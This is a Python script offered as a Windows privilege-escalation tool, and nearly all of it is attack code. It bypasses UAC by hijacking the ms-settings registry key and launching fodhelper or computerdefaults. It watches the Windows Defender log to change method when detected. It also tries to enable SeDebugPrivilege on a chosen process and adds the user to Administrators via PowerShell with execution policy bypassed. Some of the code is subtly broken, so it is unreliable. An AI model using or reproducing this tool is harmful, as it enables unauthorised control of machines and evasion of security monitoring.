import subprocess
import getpass
import ctypes
import os
import sys

from typing import Tuple

os.system('cls')

print('Welcome! Do you wish to escalate a user account or process?')

class UACBypass:
    def __init__(self):
        self.executable_path, self.is_frozen = self.get_self()

    def execute_command(self, cmd: str):
        return subprocess.run(cmd, shell=True, capture_output=True)

    def check_log_change(self, method: str) -> bool:
        log_cmd = 'wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text'
        log_count_before = len(self.execute_command(log_cmd).stdout)
        self.execute_command(f"{method} --nouacbypass")
        log_count_after = len(self.execute_command(log_cmd).stdout)
        return log_count_after > log_count_before

    def uac_bypass(self, method: int = 1) -> bool:
        if not self.is_frozen:
            return False

        reg_add_cmd = f"reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{self.executable_path}\" /f"
        reg_delete_cmd = "reg delete hkcu\\Software\\Classes\\ms-settings /f"
        
        self.execute_command(reg_add_cmd)
        self.execute_command("reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
        
        if method == 1:
            if self.check_log_change("computerdefaults"):
                self.execute_command(reg_delete_cmd)
                return self.uac_bypass(method + 1)
        elif method == 2:
            if self.check_log_change("fodhelper"):
                self.execute_command(reg_delete_cmd)
                return self.uac_bypass(method + 1)
        else:
            return False
        
        self.execute_command(reg_delete_cmd)
        return True

    def is_admin(self) -> bool:
        return ctypes.windll.shell32.IsUserAnAdmin() == 1

    def get_self(self) -> Tuple[str, bool]:
        if hasattr(sys, "frozen"):
            return (sys.executable, True)
        else:
            return (__file__, False)

    def doit(self):
        if not self.is_admin() and self.is_frozen and self.uac_bypass():
            os._exit(0)

def start():
        uac_bypass = UACBypass()
        uac_bypass.doit()
        
        hi = 1
        
        while hi == 1:
            main_window()
def main_window():
    print('1. User')
    print('2. Process')
    choice = input('Choice: ')

    if choice == '1' or choice == 'User' or choice == 'user':
        print('Trying...')
        grant_admin_user()
    elif choice == '2' or choice == 'Process' or choice == 'process':
        PID = input('PID: ')
        print('Trying...')
        elevate_process_privileges(PID)
    else:
        print('Invalid choice')   
def elevate_process_privileges(pid):
    try:
        # Open the process handle with specific access rights
        process_handle = ctypes.windll.kernel32.OpenProcess(
            0x0200 | 0x0400,  # PROCESS_QUERY_INFORMATION | PROCESS_CREATE_PROCESS
            False,  # Inherit handle
            pid
        )
        if not process_handle:
            raise ctypes.WinError()

        # Open process token
        token_handle = ctypes.wintypes.HANDLE()
        if not ctypes.windll.advapi32.OpenProcessToken(process_handle, 0x0200 | 0x0008, ctypes.byref(token_handle)):
            raise ctypes.WinError()

        # Get the LUID for the SeDebugPrivilege
        luid = ctypes.wintypes.LUID()
        if not ctypes.windll.advapi32.LookupPrivilegeValueW(None, "SeDebugPrivilege", ctypes.byref(luid)):
            raise ctypes.WinError()

        # Set up the privilege modification
        tp = ctypes.wintypes.TOKEN_PRIVILEGES()
        tp.PrivilegeCount = 1
        tp.Privileges = [(luid, 2)]  # SE_PRIVILEGE_ENABLED

        # Adjust token privileges
        if not ctypes.windll.advapi32.AdjustTokenPrivileges(token_handle, False, ctypes.byref(tp), 0, None, None):
            raise ctypes.WinError()

        ctypes.windll.kernel32.CloseHandle(token_handle)
        ctypes.windll.kernel32.CloseHandle(process_handle)

        print(f"Successfully elevated process {pid} to admin.")
    except Exception as e:
        print(f"Error elevating process {pid} to admin: {str(e)}")
def grant_admin_user():
    username = getpass.getuser()
    try:
        # PowerShell script to grant administrative privileges to a user
        powershell_script = fr'''
        $username = "{username}"
        
        # Check if user is already in Administrators group
        if (-not (Get-LocalGroupMember -Group "Administrators" | Where-Object {{ $_.Name -eq $username }})) {{
            Add-LocalGroupMember -Group "Administrators" -Member $username
            Write-Output "User $username added to Administrators group."
        }} else {{
            Write-Output "User $username is already in Administrators group."
        }}
        '''

        # Execute PowerShell script from Python
        command = ["powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", powershell_script]
        result = subprocess.run(command, check=True, capture_output=True, text=True)
        
        # Print PowerShell script output
        print(result.stdout.strip())

    except subprocess.CalledProcessError as e:
        print(f"Error granting admin rights: {e.stderr}")

start()